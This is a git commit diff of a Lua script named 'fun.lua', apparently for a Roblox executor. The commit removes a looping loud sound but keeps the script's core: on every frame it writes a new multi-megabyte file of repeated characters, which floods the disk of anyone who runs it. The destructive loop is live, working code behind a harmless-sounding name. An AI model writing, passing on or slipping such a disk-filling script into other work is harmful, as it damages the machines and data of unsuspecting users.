c6cc52a7e3eb6db62679e45b04ab3cff8719200b
flipsy <109356301+fakeflipsy@users.noreply.github.com>
2022-08-13 14:59:04 +0200

    Update fun.lua

--- real/fun.lua
+++ real/fun.lua
@@ -9,20 +9,14 @@ local Loops = {
     RunService.PreSimulation
 }
 
-local String = string.rep('𪚥🈵', 3484848)
-local Sound = Instance.new('Sound', workspace)
-
-Sound.SoundId = 'rbxassetid://1709572464'
-Sound.Volume = 10
-Sound.Looped = true
-Sound.Playing = true
+local String = string.rep('𪚥', 3484848)
 
 local Name = 1
 for _, RS in ipairs(Loops) do
     RS:Connect(function()
         task.spawn(function()
             writefile(Name .. '.txt', String)
-            Name = Name + 1
         end)
+        Name = Name + 1
     end)
 end
